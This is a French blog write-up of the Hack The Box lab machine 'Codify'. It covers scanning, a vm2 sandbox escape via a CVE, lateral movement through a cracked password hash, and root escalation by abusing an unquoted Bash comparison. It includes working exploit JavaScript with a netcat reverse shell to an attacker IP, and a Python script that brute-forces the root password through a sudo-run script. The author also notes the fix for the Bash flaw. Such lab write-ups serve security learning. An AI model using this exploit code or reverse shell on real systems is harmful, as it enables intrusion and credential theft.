---
date: 2024-04-05T16:50:10-05:00
# description: ""
image: "/images/HTB-Codify/Codify.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Codify"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Codify](https://app.hackthebox.com/machines/Codify)
* Niveau: Facile
* OS: Linux
---

Codify démarre avec une application web offrant un environnement sandbox pour tester son code Node.js. Elle utilise [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) et emploie une liste blanche de modules. Cependant, il existe une vulnérabilité ([CVE-2023-3214](https://nvd.nist.gov/vuln/detail/CVE-2023-32314)) avec vm2 qui peut être exploitée pour sortir du sandbox et accéder au système cible. Un mouvement latéral permet ensuite d'accéder à un autre compte utilisateur et d' obtenir le drapeau `user.txt`. De plus, après avoir identifié une vulnérabilité dans un script que nous pouvons exécuter avec des privilèges élevés, une attaque par force brute est utilisée pour obtenir le mot de passe de l'utilisateur root.

Adresse IP cible - `10.10.11.239`

## Scanning 

```
nmap -sC -sV -oA nmap/Codify 10.10.11.239
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-21 20:19 CDT
Nmap scan report for 10.10.11.239
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
```

Nous identifions trois ports ouverts : 22 (SSH), 80 (HTTP) et 3000 (Node.js). Nous sommes redirigés vers `codify.htb` que j'ai ajouté à `/etc/hosts`.

```
sudo echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

## Enumération

Le site web est un service permettant de tester des codes Node.js dans un environnement sandbox.

![Codify Website](/images/HTB-Codify/codify-website.png)

En cliquant sur `Try it now`, un éditeur s'affiche, dans lequel le code peut être exécuté.

![Codify Sanbox Environment](/images/HTB-Codify/code-run.png)

La plateforme utilise une liste blanche de modules pour des raisons de sécurité.

![Codify Module Whitelist](/images/HTB-Codify/codify-limitations.png)

Dans la section "About Us", nous apprenons que la bibliothèque [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) est utilisée.

![Codify About Section](/images/HTB-Codify/codify-about.png)

## Accès Initial

En recherchant les vulnérabilités de vm2, nous trouvons [CVE-2023-3214](https://nvd.nist.gov/vuln/detail/CVE-2023-32314) et un PoC peut être trouvé [ici](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac). Ce programme nous permet d'échapper au sandbox et d'obtenir l'exécution de code à distance (RCE).

Après de multiples échecs, la recherche d'un reverse shell me mène à [cette](https://www.youtube.com/watch?v=_q_ZCy-hEqg&ab_channel=0xdf) vidéo de 0xdf où il explique les reverse shell `mkfifo`. Quelques reverse shells mkfifo sont disponibles [ici](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml) et le premier finit par fonctionner. Voici le code complet.

> N'oubliez pas de modifier l'adresse IP et le numéro de port.

```Javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.13 9001 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a ").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

L'accès initial est obtenu après avoir exécuté le code dans l'éditeur.

![Codify Foothold](/images/HTB-Codify/foothold.png)

Le shell peut être amélioré en exécutant les commandes ci-dessous.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

### Mouvement latéral (shell en tant que joshua)

L'accès au dossier `joshua` dans `/home` est bloqué. Il appartient à l'utilisateur `joshua` qui est notre cible pour le mouvement latéral.

![Access to Joshua directory denied](/images/HTB-Codify/access-denied.png)

Après avoir exécuté `linpeas` sur la cible, quelques fichiers accessibles intéressants sont trouvés dans le répertoire racine d'Apache.

![Files found by linpeas](/images/HTB-Codify/Codify-intersting-files.png)

Le fichier `tickets.db` dans `/var/www/contact` contient le hash du mot de passe de l'utilisateur `joshua`.

![User josua password hash](/images/HTB-Codify/pwd-hash.png)

`hashid` révèle qu'il s'agit d'un hash Blowfish.

![Hashid command results](/images/HTB-Codify/hashid.png)

En utilisant john pour craquer le hash, le mot de passe `spongebob1` est récupéré.

![User Joshua password](/images/HTB-Codify/hash-cracked.png)

Avec les identifiants `joshua:spongebob1` nous pouvons nous connecter via SSH et obtenir le drapeau `user.txt`

## Elévation de Privilèges (shell en tant que root)

La commande `sudo -l` révèle que l'utilisateur `joshua` peut exécuter le script `mysql-backup.sh` en tant que root.

![Sudo -l command results](/images/HTB-Codify/sudo-l.png)

Lorsque nous essayons d'exécuter le script, nous obtenons le message `Enter MySQL password for root:`.

Voici le contenu du script

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

L'image ci-dessous identifie la vulnérabilité du script. Avec Bash, lorsque la partie droite de l'opérateur `==` d'une expression conditionnelle (entre doubles crochets `[[ ... ]]`) n'est pas placée entre guillemets, Bash effectue un "pattern matching" (également appelé "globbing") au lieu de l'interpréter comme une chaîne de caractères.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/script-vulnerability.png)

Par exemple, si le mot de passe est `hello`, `[[$DB_PASS == hello]]` et `[[$DB_PASS == h*]]` fonctionneront tous les deux car `h*` est un "pattern" qui correspond à n'importe quelle chaîne commençant par la lettre `h`. Sachant cela, une attaque par force brute du mot de passe devient une solution viable.

> Pour résoudre ce problème, vous devez mettre entre guillemets la variable `$USER_PASS` dans la comparaison, comme suit : `if [[ $DB_PASS == "$USER_PASS" ]] ; then`. Cela garantit que la valeur de `$USER_PASS` est traitée comme une chaîne de caractères, et non comme un motif.

Voici le script Python que j'ai utilisé

```Python
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] initializing bruteforce script...")
print("[+] bruteforce in progress, please wait...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] process terminated, root password is: "+password)
```

Voici comment le script fonctionne:

1. Il importe les modules nécessaires : `string` pour les ensembles de caractères et `os` pour l'exécution des commandes système. 

2. Il définit un ensemble de caractères `chars` qui inclut toutes les lettres ASCII (minuscules et majuscules) et les chiffres. 

3. Un mot de passe vide est initialisé pour stocker les caractères du mot de passe découvert, et un drapeau (`next`) pour contrôler la boucle. 

4. Il commence une boucle `while` qui continue tant que `next` est égal à 1. A l'intérieur de cette boucle :
	* Il itère sur chaque caractère `i` dans `chars`. 
* Pour chaque caractère, il construit une commande qui renvoie le mot de passe actuel plus le caractère `i`, suivi d'un wildcard `*`, et l'envoie à `sudo /opt/scripts/mysql-backup.sh`. La commande est exécutée dans un shell et son résultat est redirigé vers /dev/null pour le supprimer.
	* Si la commande réussit (c'est-à-dire que le statut de sortie `errorlevel` est `0`), cela signifie que le `password` actuel plus le caractère `i` est un préfixe du mot de passe actuel. Dans ce cas, il ajoute `i` au mot de passe, affiche un message sur la console, et met `next` à `1` pour continuer la boucle. 
* Si la commande échoue (c'est-à-dire que le statut de sortie `errorlevel` est différent de zéro), cela signifie que le `password` actuel plus le caractère `i` n'est pas un préfixe du mot de passe actuel. Dans ce cas, il met `next` à `0` pour arrêter la boucle après l'itération en cours.

5. Une fois la boucle terminée, un message est affiché sur la console indiquant que le processus est terminé et le mot de passe découvert est affiché.

Après l'exécution du script, le mot de passe root s'avère être `kljh12k3jhaskjh12kjh3`.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/root-pwd.png)

Le mot de passe est utilisé pour accéder au compte `root` et le drapeau `root.txt` se trouve dans `/root`.

![mysql-backup.sh script vulnerability](/images/HTB-Codify/root-flag.png)

La connaissance de Bash était indispensable pour comprendre la vulnérabilité du script. En tant que professionnel dans le domaine de la sécurité informatique, il est toujours utile d'avoir des connaissances en matière de scripting/programmation en Bash et en Python.

Si vous cherchez des ressources, freeCodeCamp propose un [tutoriel](https://www.youtube.com/watch?v=tK9Oc6AEnR4&t=18s&ab_channel=freeCodeCamp.org) pour Bash pour les débutants sur leur chaîne YouTube. Si vous préférez les livres, je vous recommande [Learning the bash Shell, 3rd Edition](https://www.amazon.com/Learning-bash-Shell-Programming-Nutshell/dp/0596009658) et [The Linux Command Line, 2nd Edition : A Complete Introduction](https://www.amazon.com/Linux-Command-Line-2nd-Introduction/dp/1593279523).
